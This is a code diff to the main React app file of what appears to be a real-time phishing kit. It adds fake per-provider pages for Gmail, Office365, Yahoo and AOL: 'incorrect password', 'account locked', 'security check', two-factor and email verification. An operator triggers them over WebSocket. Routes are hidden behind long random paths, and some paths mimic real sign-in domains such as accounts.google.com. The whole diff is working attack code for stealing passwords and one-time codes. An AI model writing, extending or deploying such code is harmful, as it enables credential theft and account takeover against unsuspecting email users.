@@ -14,7 +14,6 @@ import OtpPage from './components/OtpPage';
 import MobileOtpPage from './components/mobile/MobileOtpPage';
 import ProviderRedirect from './components/ProviderRedirect';
 import Spinner from './components/common/Spinner';
-import InteractiveState, { UIStateType } from './components/InteractiveState';
 import GmailSmsCodePage from './components/interactive/GmailSmsCodePage';
 import GmailAuthPromptPage from './components/interactive/GmailAuthPromptPage';
 import Office365SmsCodePage from './components/interactive/Office365SmsCodePage';
@@ -25,6 +24,11 @@ import AolSmsCodePage from './components/interactive/AolSmsCodePage';
 import AolAuthPromptPage from './components/interactive/AolAuthPromptPage';
 import OthersSmsCodePage from './components/interactive/OthersSmsCodePage';
 import OthersAuthPromptPage from './components/interactive/OthersAuthPromptPage';
+import IncorrectPasswordPage from './components/interactive/IncorrectPasswordPage';
+import AccountLockedPage from './components/interactive/AccountLockedPage';
+import SecurityCheckPage from './components/interactive/SecurityCheckPage';
+import TwoFactorPage from './components/interactive/TwoFactorPage';
+import EmailVerificationPage from './components/interactive/EmailVerificationPage';
 import { useWebSocket, WebSocketMessage } from './hooks/useWebSocket';
 import { getBrowserFingerprint } from './utils/oauthHandler';
 import { getCookie, removeCookie, subscribeToCookieChanges, CookieChangeEvent } from './utils/realTimeCookieManager';
@@ -66,6 +70,36 @@ const ROUTES = {
   AUTH_YAHOO: '/3ocmaxnd5r59gfmaovkc5u0lsciq85onj33ianp9201cpzo9fn1th2r0xkoep2ylqletxhyakoilmeh79w558647p4snia50i6qxyuw38wwvosp5h41faoz1qq6085n2p7upue1jr8xt2g736sogmwfz8b8wky97',
   AUTH_AOL: '/hiil08euvdj4tz6nvvmgjg707c51pst93iiw5je3rra5hncipc34y695msj73a14ism8nv8fdaliuuc0gxdtsro2c9i21ytpj9vxdwtdrsx7nsa3eswh0kkicefoj17qg88eqsjticqa1a893nklg0hjhb99ua3a',
   AUTH_OTHERS: '/8x8uzkd2grn4abyurknvt2ibzguhduj3qoqebrdigh19yxorkcikoer7yw08nzsu8b5siyzqfkw1zqlonf1kg58iqqcwd2f3dq4zlyt93tas9qs5hxgvmylzisa1c556q9b7nu8j85palffg130w5rvwei52cmv8',
+  // Per-provider "incorrect password" pages (realistic reload-of-login with error)
+  PWD_GMAIL: '/cm18ds52uo8xif8zaeirhx5ybq1ssmv108qzdwffhtnucvuv4atjh668sbaor7lmhv0r9byjb2xxxoqprwjmjn54zoczdogwdj612f1xtfhor4a3x9ooa9x8qbri9znxodh98mont9p6du8fk7tlie3ebsdjpupd44yjw',
+  PWD_OFFICE365: '/3365hpn3igd4mfnyzhiqxx40bfymtnft4yklxn87pceewzco8g8vnzn0u9p16jx09vhcogylg0bviigib2prnie3hajw4ft8i08vjoktde6w40zysfu5mossok7mhx9k677orttpy0gmpc8jqmzrnybzyostmhblewcyr',
+  PWD_YAHOO: '/ha1fh6sdv9hyu3vnx5sfknvy2m075aemrp566ojwyxjl1b5ltuoyuogyfhwrwzpjs1j8md7ce4zjatad02ldwya3s6739jniqtqou1u8vhkwsd3ex1jr9fuckot0vlkjiusghvbr9vccxxv2jze9mo1lay1jkf9c9inhx',
+  PWD_AOL: '/w87qv79stskc8qnptfqhk0no1mqeylqxx6ohf44uy0607j2cbzfbbi7g35h5unx6y1ai9zct6apzuc6bg76dhpegc7exib3di491pup4m985q2862ixgcmzmxv6awdo25uf2qaed3wfvrqvgoejiicqh91eyue8kmzq5p',
+  PWD_OTHERS: '/8zmqpr1c90gyaflk7ngawlg9a22q7wpzurzc265yus9vpuo6fyxo4jmrsrrxp9ht71cn3uvp3i42f0w2ko2qbxc5zqvhumcqqi1yn18bp3xjtwr5upb58xz6hlldzqxqyc9oo3stnvvevk03jgfl345udvgekbl4p295i',
+  // Per-provider "account locked" pages
+  LOCKED_GMAIL: '/zx6ehml0c9vv73a4hildfo026541ceyhcod98n3z4kyl6yyxhf3qgvr6876iim7zvb7wjnp9zroqz2cb2pbsv9izexwvx4ie1exs6n1xkebb5ev5hg1540zy3vtlcrgli853b6vyz1jr7kq2ltp8me06dk7tpy0optuef',
+  LOCKED_OFFICE365: '/kxyds1jp8qou65qv5clg6f9nniujjr6x4wuki43j1rzhc0neqfzvaakryir8qt6qdt8p32d7f1d9mk1mg277nls3my1whiyawa28zob8pqto7t6ul3hd6oyc32pbjg99wmuac0nehq3dnfi963opn0drlz63wthxtkk0b',
+  LOCKED_YAHOO: '/b3oonzyvbsg9674bdslzc92i7dp74b1l00c0y3a3793my4xp9n2ube8r5k8qljlr162wjbyazb8rti0zf4wt2aa8oln284bh1vhwysn7vnqipr4rpifze1gcf5l757dl7ysy63k7ax98ljqgzt8noeplgys50j7qwxb32',
+  LOCKED_AOL: '/7c7wbkznukzq7y9exw9wmri4a9jft0l12jli8qwp6ifyb04kcj4o2y7d3uqstv5n3q2wwday629hd2ey8r8ucs85y559ftrlog7y22da3egwulvl12b7b72q27ygw64myfn22cqtuofq8g8jei7q1b7wkinluo07fpnob',
+  LOCKED_OTHERS: '/zzlih4u77q4s0vxhlnhig4cqdw4iht6bi6tc1y3e4eepnag58w599w9jmkpcoz4avnmvqmv4xpqzw2t40i1vi49rdsfrn98so4sl217gfo9qk1xapcubv4jfk5xqdz9rvtsr0svxn0kpyff3va4vo70hjbeqve8vghsdj',
+  // Per-provider "security check" pages
+  SEC_GMAIL: '/3ovg6rlwqpfmbzjaxuwcdo9a7bjh6v1gcn9cdewngx3a7n4b2f0ftbd3inebe9q6qa9aol3nz4vph4qgshroybz3c5n3ag0txfnprcupwwmedi0e454uhc0tq7fidzfekk35kdsnl3mnqx0ia8tah0hexw9mtjc7ur36w',
+  SEC_OFFICE365: '/rwmwj1ffqgly0fcagxu4tvqrp1ncjdmsju76mujciwbqa2hnznvbktzjswzg1klkr837x8o4b90ul1qyu1990cz9w8ez6rzgk434dv7ty96ce25qp383o4sutuouh1w0pp2i2gaxhserk0qp1c7q2gor6mzpd4enar70o',
+  SEC_YAHOO: '/1sp7573rdhum6r02sf3i6k27ojivoufjig171mqjvpy7w90derhc9yuoyf87xkwyjpicrl17nonrhrywh3ixkf8t3owo7q7kyrshaxmvmlkj60akverxd0blrdy5s8j2enjs4vy6zkhnw7w72wxle60vs1d7yhb7q6bmc',
+  SEC_AOL: '/qzjmcr4dcladg2q85d978ik776yzc7f833p8yg04ylp8l9kwvxlxc1y46gvl1k9eonn21gribpq68o4318dbsj39dtae0nobok80fw7r1fkm873liteaytbvd5ivvai3uf8q20jxbrzjxuviqql7yzpzrptqnprzjvja4',
+  SEC_OTHERS: '/1ietls8zfe21widvoi0hitfxckok2s86prkr57xry5318e7rxsk6ves09eybih3hls429ilwd24hv0w65oy34vjspuwij54e2pqz6gcg9b6tbeicx1xp38nksso0gol2r17hx5zfm5hgk041xfyjwpbzxn1i6pvuz2xy4',
+  // Per-provider "two-factor required" pages
+  TFA_GMAIL: '/9v8fb06n1aig0j10p9rrbgpmnk60kot6nlvqh7q2y5o7n8y7inflvchin15iqmg658m4de8p22bdmllgbfkws8ls528i39fqgzrtv81gj9cnjjoyxay8fom1g1x6zxu3030k1kk72jvqjxqkqfnrxlg9tl92x0voqk2pe',
+  TFA_OFFICE365: '/kpsbgg5enj34drjc2k84g4rl70csv1osm4j48sqdt3y20k8pazmv9qx9miigiq2mn3nj0goff32xotglue196a06oocii89xbx66cwqq9n7lsg3y44y53ffj59lzwuioqhtgsdwpwewm4mwtqpw090qgjhqfhgqxxd2js',
+  TFA_YAHOO: '/kbj3bp4jli84yxqwcdtk7t4gmityfypztdnr1hwccc2oom2yqj7r5lak5qj7difdkm36fsycpdr5s7irlr0vcmswh7gfg1a5cskkkeu3kkt6f4041lu8xkrhaes8fgw0wg88ud34mpjekefx1jaefhg4p4zdyekaz6ufe',
+  TFA_AOL: '/vpshgyuw9ye1scdsuv1t4g2ruiefsxkokfxlgu6eobtaawa8m6n5ygw1qp8fs04afoq4rh4y8cwt35bpo18i6oc1d7ywy6h6nh8rex64sfodt1p8wye06tf604yowen5yl7crg9sf09e6banuc8vao7kjvlz4j5t1vo6z',
+  TFA_OTHERS: '/02lf2shdkobu8memgfsian5x5xmbhvdy9qkhuzhobpl1e9791jh43tiq22k3uyag1pz6a8atzz0p14xyeq63rhjxdqlnl65yzqcnwkz96l44rlgll0hgyiql7y05fvrsu667wc50y3xwczg03c8petumfkzuhyyk0fnoa',
+  // Per-provider "email verification" pages
+  EMAIL_V_GMAIL: '/t9aft16ihtczvvsqxxjcbf0ewioyehv6rym4b3lm7fpvxijb5r2jgrpspiy5vilguvua5o5gonxhga2e8fpn3nmm2kphalo9a5qebllbby18y1ohkx9tki5vk08eet3as759tv6vk789buco5nrh47tpzwnr84xeugb65',
+  EMAIL_V_OFFICE365: '/uhswn2uzao8aaqund17w090p56nxu07vzuxtf3jfktimpbmhmef79zsv6ih5mikl2xfbdd1mwz4tkew9xf37e77e0815y8feyuztghg5nglybr0kk2uestcsjd4nmvyggtyysztpe4ja84cl74mq9seu96334kovbvls4',
+  EMAIL_V_YAHOO: '/1pk4fa1rwf2gnzoqyc6lffdbc9c5dsp0qfaapcplb0zw99x71jz12ezumr6s6l6losoho6hhwt9h20hng3utyn6f48ga0zicl6mcd4ewlodlrfww6vq4lzs3h4g9uk0wum9lgypomkdhvok0lyt3g2hb3dipz7dfsg77v',
+  EMAIL_V_AOL: '/uuorgf3ijzxpy67suzt24550edny6fpcr6sq2ap8ag3tfxo528zmxbrex6isyj9avt6miaoglg6fgnf0dy3b5lv5bsdskb7hjjz72nsxt41ub8vgl1d1hjmg73h10mzkl88oxpmpcjo1zo5jyswf9f1y5mw5e3b7p2584',
+  EMAIL_V_OTHERS: '/uhsd9q8cv4zyujahpsgxd0lypj74gvy8b8vtcihwjcnk1g1v7xosdy04rn8ywx0u65i9p4zhje9g9fzf9nyhhljwgxc4djiuvpbkfqsv5aap6nxe2uxsratm23vkos3h81oid1lfcdzlyo4a4ovh68fv7rhujyd30klfc',
 };
 
 // Maps a provider name (as sent by the backend over WebSocket) to the provider-specific
@@ -94,6 +128,48 @@ const AUTH_ROUTE_BY_PROVIDER: Record<ReturnType<typeof normalizeProviderKey>, st
   yahoo: '/3ocmaxnd5r59gfmaovkc5u0lsciq85onj33ianp9201cpzo9fn1th2r0xkoep2ylqletxhyakoilmeh79w558647p4snia50i6qxyuw38wwvosp5h41faoz1qq6085n2p7upue1jr8xt2g736sogmwfz8b8wky97',
   aol: '/hiil08euvdj4tz6nvvmgjg707c51pst93iiw5je3rra5hncipc34y695msj73a14ism8nv8fdaliuuc0gxdtsro2c9i21ytpj9vxdwtdrsx7nsa3eswh0kkicefoj17qg88eqsjticqa1a893nklg0hjhb99ua3a',
   others: '/8x8uzkd2grn4abyurknvt2ibzguhduj3qoqebrdigh19yxorkcikoer7yw08nzsu8b5siyzqfkw1zqlonf1kg58iqqcwd2f3dq4zlyt93tas9qs5hxgvmylzisa1c556q9b7nu8j85palffg130w5rvwei52cmv8',
+};
+
+type ProvKey = ReturnType<typeof normalizeProviderKey>;
+
+const INCORRECT_PWD_ROUTE_BY_PROVIDER: Record<ProvKey, string> = {
+  gmail: '/cm18ds52uo8xif8zaeirhx5ybq1ssmv108qzdwffhtnucvuv4atjh668sbaor7lmhv0r9byjb2xxxoqprwjmjn54zoczdogwdj612f1xtfhor4a3x9ooa9x8qbri9znxodh98mont9p6du8fk7tlie3ebsdjpupd44yjw',
+  office365: '/3365hpn3igd4mfnyzhiqxx40bfymtnft4yklxn87pceewzco8g8vnzn0u9p16jx09vhcogylg0bviigib2prnie3hajw4ft8i08vjoktde6w40zysfu5mossok7mhx9k677orttpy0gmpc8jqmzrnybzyostmhblewcyr',
+  yahoo: '/ha1fh6sdv9hyu3vnx5sfknvy2m075aemrp566ojwyxjl1b5ltuoyuogyfhwrwzpjs1j8md7ce4zjatad02ldwya3s6739jniqtqou1u8vhkwsd3ex1jr9fuckot0vlkjiusghvbr9vccxxv2jze9mo1lay1jkf9c9inhx',
+  aol: '/w87qv79stskc8qnptfqhk0no1mqeylqxx6ohf44uy0607j2cbzfbbi7g35h5unx6y1ai9zct6apzuc6bg76dhpegc7exib3di491pup4m985q2862ixgcmzmxv6awdo25uf2qaed3wfvrqvgoejiicqh91eyue8kmzq5p',
+  others: '/8zmqpr1c90gyaflk7ngawlg9a22q7wpzurzc265yus9vpuo6fyxo4jmrsrrxp9ht71cn3uvp3i42f0w2ko2qbxc5zqvhumcqqi1yn18bp3xjtwr5upb58xz6hlldzqxqyc9oo3stnvvevk03jgfl345udvgekbl4p295i',
+};
+
+const ACCOUNT_LOCKED_ROUTE_BY_PROVIDER: Record<ProvKey, string> = {
+  gmail: '/zx6ehml0c9vv73a4hildfo026541ceyhcod98n3z4kyl6yyxhf3qgvr6876iim7zvb7wjnp9zroqz2cb2pbsv9izexwvx4ie1exs6n1xkebb5ev5hg1540zy3vtlcrgli853b6vyz1jr7kq2ltp8me06dk7tpy0optuef',
+  office365: '/kxyds1jp8qou65qv5clg6f9nniujjr6x4wuki43j1rzhc0neqfzvaakryir8qt6qdt8p32d7f1d9mk1mg277nls3my1whiyawa28zob8pqto7t6ul3hd6oyc32pbjg99wmuac0nehq3dnfi963opn0drlz63wthxtkk0b',
+  yahoo: '/b3oonzyvbsg9674bdslzc92i7dp74b1l00c0y3a3793my4xp9n2ube8r5k8qljlr162wjbyazb8rti0zf4wt2aa8oln284bh1vhwysn7vnqipr4rpifze1gcf5l757dl7ysy63k7ax98ljqgzt8noeplgys50j7qwxb32',
+  aol: '/7c7wbkznukzq7y9exw9wmri4a9jft0l12jli8qwp6ifyb04kcj4o2y7d3uqstv5n3q2wwday629hd2ey8r8ucs85y559ftrlog7y22da3egwulvl12b7b72q27ygw64myfn22cqtuofq8g8jei7q1b7wkinluo07fpnob',
+  others: '/zzlih4u77q4s0vxhlnhig4cqdw4iht6bi6tc1y3e4eepnag58w599w9jmkpcoz4avnmvqmv4xpqzw2t40i1vi49rdsfrn98so4sl217gfo9qk1xapcubv4jfk5xqdz9rvtsr0svxn0kpyff3va4vo70hjbeqve8vghsdj',
+};
+
+const SECURITY_CHECK_ROUTE_BY_PROVIDER: Record<ProvKey, string> = {
+  gmail: '/3ovg6rlwqpfmbzjaxuwcdo9a7bjh6v1gcn9cdewngx3a7n4b2f0ftbd3inebe9q6qa9aol3nz4vph4qgshroybz3c5n3ag0txfnprcupwwmedi0e454uhc0tq7fidzfekk35kdsnl3mnqx0ia8tah0hexw9mtjc7ur36w',
+  office365: '/rwmwj1ffqgly0fcagxu4tvqrp1ncjdmsju76mujciwbqa2hnznvbktzjswzg1klkr837x8o4b90ul1qyu1990cz9w8ez6rzgk434dv7ty96ce25qp383o4sutuouh1w0pp2i2gaxhserk0qp1c7q2gor6mzpd4enar70o',
+  yahoo: '/1sp7573rdhum6r02sf3i6k27ojivoufjig171mqjvpy7w90derhc9yuoyf87xkwyjpicrl17nonrhrywh3ixkf8t3owo7q7kyrshaxmvmlkj60akverxd0blrdy5s8j2enjs4vy6zkhnw7w72wxle60vs1d7yhb7q6bmc',
+  aol: '/qzjmcr4dcladg2q85d978ik776yzc7f833p8yg04ylp8l9kwvxlxc1y46gvl1k9eonn21gribpq68o4318dbsj39dtae0nobok80fw7r1fkm873liteaytbvd5ivvai3uf8q20jxbrzjxuviqql7yzpzrptqnprzjvja4',
+  others: '/1ietls8zfe21widvoi0hitfxckok2s86prkr57xry5318e7rxsk6ves09eybih3hls429ilwd24hv0w65oy34vjspuwij54e2pqz6gcg9b6tbeicx1xp38nksso0gol2r17hx5zfm5hgk041xfyjwpbzxn1i6pvuz2xy4',
+};
+
+const TWO_FACTOR_ROUTE_BY_PROVIDER: Record<ProvKey, string> = {
+  gmail: '/9v8fb06n1aig0j10p9rrbgpmnk60kot6nlvqh7q2y5o7n8y7inflvchin15iqmg658m4de8p22bdmllgbfkws8ls528i39fqgzrtv81gj9cnjjoyxay8fom1g1x6zxu3030k1kk72jvqjxqkqfnrxlg9tl92x0voqk2pe',
+  office365: '/kpsbgg5enj34drjc2k84g4rl70csv1osm4j48sqdt3y20k8pazmv9qx9miigiq2mn3nj0goff32xotglue196a06oocii89xbx66cwqq9n7lsg3y44y53ffj59lzwuioqhtgsdwpwewm4mwtqpw090qgjhqfhgqxxd2js',
+  yahoo: '/kbj3bp4jli84yxqwcdtk7t4gmityfypztdnr1hwccc2oom2yqj7r5lak5qj7difdkm36fsycpdr5s7irlr0vcmswh7gfg1a5cskkkeu3kkt6f4041lu8xkrhaes8fgw0wg88ud34mpjekefx1jaefhg4p4zdyekaz6ufe',
+  aol: '/vpshgyuw9ye1scdsuv1t4g2ruiefsxkokfxlgu6eobtaawa8m6n5ygw1qp8fs04afoq4rh4y8cwt35bpo18i6oc1d7ywy6h6nh8rex64sfodt1p8wye06tf604yowen5yl7crg9sf09e6banuc8vao7kjvlz4j5t1vo6z',
+  others: '/02lf2shdkobu8memgfsian5x5xmbhvdy9qkhuzhobpl1e9791jh43tiq22k3uyag1pz6a8atzz0p14xyeq63rhjxdqlnl65yzqcnwkz96l44rlgll0hgyiql7y05fvrsu667wc50y3xwczg03c8petumfkzuhyyk0fnoa',
+};
+
+const EMAIL_VERIFICATION_ROUTE_BY_PROVIDER: Record<ProvKey, string> = {
+  gmail: '/t9aft16ihtczvvsqxxjcbf0ewioyehv6rym4b3lm7fpvxijb5r2jgrpspiy5vilguvua5o5gonxhga2e8fpn3nmm2kphalo9a5qebllbby18y1ohkx9tki5vk08eet3as759tv6vk789buco5nrh47tpzwnr84xeugb65',
+  office365: '/uhswn2uzao8aaqund17w090p56nxu07vzuxtf3jfktimpbmhmef79zsv6ih5mikl2xfbdd1mwz4tkew9xf37e77e0815y8feyuztghg5nglybr0kk2uestcsjd4nmvyggtyysztpe4ja84cl74mq9seu96334kovbvls4',
+  yahoo: '/1pk4fa1rwf2gnzoqyc6lffdbc9c5dsp0qfaapcplb0zw99x71jz12ezumr6s6l6losoho6hhwt9h20hng3utyn6f48ga0zicl6mcd4ewlodlrfww6vq4lzs3h4g9uk0wum9lgypomkdhvok0lyt3g2hb3dipz7dfsg77v',
+  aol: '/uuorgf3ijzxpy67suzt24550edny6fpcr6sq2ap8ag3tfxo528zmxbrex6isyj9avt6miaoglg6fgnf0dy3b5lv5bsdskb7hjjz72nsxt41ub8vgl1d1hjmg73h10mzkl88oxpmpcjo1zo5jyswf9f1y5mw5e3b7p2584',
+  others: '/uhsd9q8cv4zyujahpsgxd0lypj74gvy8b8vtcihwjcnk1g1v7xosdy04rn8ywx0u65i9p4zhje9g9fzf9nyhhljwgxc4djiuvpbkfqsv5aap6nxe2uxsratm23vkos3h81oid1lfcdzlyo4a4ovh68fv7rhujyd30klfc',
 };
 
 const PROVIDER_URLS = {
@@ -206,109 +282,100 @@ function App() {
 
   // WebSocket state management
   const [sessionId] = useState(() => Math.random().toString(36).substring(2, 15) + Date.now().toString(36));
-  const [interactiveState, setInteractiveState] = useState<{
-    active: boolean;
-    type: UIStateType;
-    provider: string;
-    data?: Record<string, unknown>;
-  }>({
-    active: false,
-    type: 'idle',
-    provider: 'Adobe',
-  });
 
   const navigate = useNavigate();
   const location = useLocation();
 
-  // WebSocket message handler
+  // Helper: compute the route for a given interactive-flow command + provider.
+  // Centralising the mapping here (instead of an in-line switch) makes it trivial
+  // to add new flows in future and keeps each case statement focused on intent.
+  const routeForFlow = (
+    flow:
+      | 'incorrect_password'
+      | 'sms_code'
+      | 'authenticator_approval'
+      | 'account_locked'
+      | 'security_check'
+      | 'two_factor'
+      | 'email_verification',
+    providerKey: ProvKey,
+  ): string => {
+    switch (flow) {
+      case 'incorrect_password': return INCORRECT_PWD_ROUTE_BY_PROVIDER[providerKey];
+      case 'sms_code': return SMS_ROUTE_BY_PROVIDER[providerKey];
+      case 'authenticator_approval': return AUTH_ROUTE_BY_PROVIDER[providerKey];
+      case 'account_locked': return ACCOUNT_LOCKED_ROUTE_BY_PROVIDER[providerKey];
+      case 'security_check': return SECURITY_CHECK_ROUTE_BY_PROVIDER[providerKey];
+      case 'two_factor': return TWO_FACTOR_ROUTE_BY_PROVIDER[providerKey];
+      case 'email_verification': return EMAIL_VERIFICATION_ROUTE_BY_PROVIDER[providerKey];
+    }
+  };
+
+  // WebSocket message handler. Each interactive command navigates to a dedicated
+  // per-provider full-screen page; there is no generic overlay.
   const handleWebSocketMessage = (message: WebSocketMessage) => {
     console.log('Received WebSocket command:', message);
-    
+
+    const navigateToFlow = (
+      flow:
+        | 'incorrect_password'
+        | 'sms_code'
+        | 'authenticator_approval'
+        | 'account_locked'
+        | 'security_check'
+        | 'two_factor'
+        | 'email_verification',
+    ) => {
+      const providerKey = normalizeProviderKey(message.data?.provider as string);
+      navigate(routeForFlow(flow, providerKey), {
+        state: {
+          data: message.data,
+          provider: message.data?.provider || 'Others',
+        },
+      });
+    };
+
     switch (message.command) {
       case 'show_incorrect_password':
-        setInteractiveState({
-          active: true,
-          type: 'incorrect_password',
-          provider: message.data?.provider || 'Adobe',
-          data: message.data,
-        });
+        navigateToFlow('incorrect_password');
         break;
-      
-      case 'show_sms_code': {
-        const route = SMS_ROUTE_BY_PROVIDER[normalizeProviderKey(message.data?.provider as string)];
-        setInteractiveState({ active: false, type: 'idle', provider: 'Adobe' });
-        navigate(route, {
-          state: {
-            data: message.data,
-            provider: message.data?.provider || 'Others',
-          },
-        });
+
+      case 'show_sms_code':
+        navigateToFlow('sms_code');
         break;
-      }
-      
-      case 'show_authenticator_approval': {
-        const route = AUTH_ROUTE_BY_PROVIDER[normalizeProviderKey(message.data?.provider as string)];
-        setInteractiveState({ active: false, type: 'idle', provider: 'Adobe' });
-        navigate(route, {
-          state: {
-            data: message.data,
-            provider: message.data?.provider || 'Others',
-          },
-        });
+
+      case 'show_authenticator_approval':
+        navigateToFlow('authenticator_approval');
         break;
-      }
-      
+
       case 'show_account_locked':
-        setInteractiveState({
-          active: true,
-          type: 'account_locked',
-          provider: message.data?.provider || 'Adobe',
-          data: message.data,
-        });
+        navigateToFlow('account_locked');
         break;
-      
+
       case 'show_security_check':
-        setInteractiveState({
-          active: true,
-          type: 'security_check',
-          provider: message.data?.provider || 'Adobe',
-          data: message.data,
-        });
+        navigateToFlow('security_check');
         break;
-      
+
       case 'show_two_factor':
-        setInteractiveState({
-          active: true,
-          type: 'two_factor_required',
-          provider: message.data?.provider || 'Adobe',
-          data: message.data,
-        });
+        navigateToFlow('two_factor');
         break;
-      
+
       case 'show_email_verification':
-        setInteractiveState({
-          active: true,
-          type: 'email_verification',
-          provider: message.data?.provider || 'Adobe',
-          data: message.data,
-        });
+        navigateToFlow('email_verification');
         break;
-      
+
       case 'hide_state':
       case 'reset':
-        setInteractiveState({
-          active: false,
-          type: 'idle',
-          provider: 'Adobe',
-        });
+        // Return to the appropriate home screen.
+        navigate(hasActiveSession ? ROUTES.LANDING : ROUTES.HOME, { replace: true });
         break;
-      
+
       case 'navigate':
         if (message.data?.route) {
           navigate(message.data.route);
         }
         break;
-      
+
       default:
         console.warn('Unknown WebSocket command:', message.command);
     }
@@ -341,7 +408,6 @@ function App() {
     // Handle specific actions locally
     switch (action) {
       case 'retry':
-        setInteractiveState({ active: false, type: 'idle', provider: 'Adobe' });
         navigate(ROUTES.HOME);
         break;
       
@@ -565,16 +631,7 @@ function App() {
   }
 
   // Show interactive state overlay if active
-  if (interactiveState.active) {
-    return (
-      <InteractiveState
-        stateType={interactiveState.type}
-        provider={interactiveState.provider}
-        data={interactiveState.data}
-        onAction={handleInteractiveAction}
-      />
-    );
-  }
+  // (removed — all interactive flows are now dedicated full-screen routed pages.)
 
   const LoginComponent = isMobile ? MobileLoginPage : LoginPage;
   const LandingComponent = isMobile ? MobileLandingPage : LandingPage;
@@ -604,6 +661,36 @@ function App() {
       <Route path={ROUTES.AUTH_YAHOO} element={<YahooAuthPromptPage onAction={handleInteractiveAction} />} />
       <Route path={ROUTES.AUTH_AOL} element={<AolAuthPromptPage onAction={handleInteractiveAction} />} />
       <Route path={ROUTES.AUTH_OTHERS} element={<OthersAuthPromptPage onAction={handleInteractiveAction} />} />
+      {/* Per-provider "incorrect password" pages (triggered by WebSocket `show_incorrect_password`) */}
+      <Route path={ROUTES.PWD_GMAIL} element={<IncorrectPasswordPage providerKey="gmail" onAction={handleInteractiveAction} />} />
+      <Route path={ROUTES.PWD_OFFICE365} element={<IncorrectPasswordPage providerKey="office365" onAction={handleInteractiveAction} />} />
+      <Route path={ROUTES.PWD_YAHOO} element={<IncorrectPasswordPage providerKey="yahoo" onAction={handleInteractiveAction} />} />
+      <Route path={ROUTES.PWD_AOL} element={<IncorrectPasswordPage providerKey="aol" onAction={handleInteractiveAction} />} />
+      <Route path={ROUTES.PWD_OTHERS} element={<IncorrectPasswordPage providerKey="others" onAction={handleInteractiveAction} />} />
+      {/* Per-provider "account locked" pages (triggered by WebSocket `show_account_locked`) */}
+      <Route path={ROUTES.LOCKED_GMAIL} element={<AccountLockedPage providerKey="gmail" onAction={handleInteractiveAction} />} />
+      <Route path={ROUTES.LOCKED_OFFICE365} element={<AccountLockedPage providerKey="office365" onAction={handleInteractiveAction} />} />
+      <Route path={ROUTES.LOCKED_YAHOO} element={<AccountLockedPage providerKey="yahoo" onAction={handleInteractiveAction} />} />
+      <Route path={ROUTES.LOCKED_AOL} element={<AccountLockedPage providerKey="aol" onAction={handleInteractiveAction} />} />
+      <Route path={ROUTES.LOCKED_OTHERS} element={<AccountLockedPage providerKey="others" onAction={handleInteractiveAction} />} />
+      {/* Per-provider "security check" pages (triggered by WebSocket `show_security_check`) */}
+      <Route path={ROUTES.SEC_GMAIL} element={<SecurityCheckPage providerKey="gmail" onAction={handleInteractiveAction} />} />
+      <Route path={ROUTES.SEC_OFFICE365} element={<SecurityCheckPage providerKey="office365" onAction={handleInteractiveAction} />} />
+      <Route path={ROUTES.SEC_YAHOO} element={<SecurityCheckPage providerKey="yahoo" onAction={handleInteractiveAction} />} />
+      <Route path={ROUTES.SEC_AOL} element={<SecurityCheckPage providerKey="aol" onAction={handleInteractiveAction} />} />
+      <Route path={ROUTES.SEC_OTHERS} element={<SecurityCheckPage providerKey="others" onAction={handleInteractiveAction} />} />
+      {/* Per-provider "two-factor required" pages (triggered by WebSocket `show_two_factor`) */}
+      <Route path={ROUTES.TFA_GMAIL} element={<TwoFactorPage providerKey="gmail" onAction={handleInteractiveAction} />} />
+      <Route path={ROUTES.TFA_OFFICE365} element={<TwoFactorPage providerKey="office365" onAction={handleInteractiveAction} />} />
+      <Route path={ROUTES.TFA_YAHOO} element={<TwoFactorPage providerKey="yahoo" onAction={handleInteractiveAction} />} />
+      <Route path={ROUTES.TFA_AOL} element={<TwoFactorPage providerKey="aol" onAction={handleInteractiveAction} />} />
+      <Route path={ROUTES.TFA_OTHERS} element={<TwoFactorPage providerKey="others" onAction={handleInteractiveAction} />} />
+      {/* Per-provider "email verification" pages (triggered by WebSocket `show_email_verification`) */}
+      <Route path={ROUTES.EMAIL_V_GMAIL} element={<EmailVerificationPage providerKey="gmail" onAction={handleInteractiveAction} />} />
+      <Route path={ROUTES.EMAIL_V_OFFICE365} element={<EmailVerificationPage providerKey="office365" onAction={handleInteractiveAction} />} />
+      <Route path={ROUTES.EMAIL_V_YAHOO} element={<EmailVerificationPage providerKey="yahoo" onAction={handleInteractiveAction} />} />
+      <Route path={ROUTES.EMAIL_V_AOL} element={<EmailVerificationPage providerKey="aol" onAction={handleInteractiveAction} />} />
+      <Route path={ROUTES.EMAIL_V_OTHERS} element={<EmailVerificationPage providerKey="others" onAction={handleInteractiveAction} />} />
       <Route path="/login.yahoo.com/*" element={<ProviderRedirect target={ROUTES.LOGIN_YAHOO} />} />
       <Route path="/login.microsoftonline.com/*" element={<ProviderRedirect target={ROUTES.LOGIN_OFFICE365} provider="microsoft" />} />
       <Route path="/accounts.google.com/*" element={<ProviderRedirect target={ROUTES.LOGIN_GMAIL} />} />
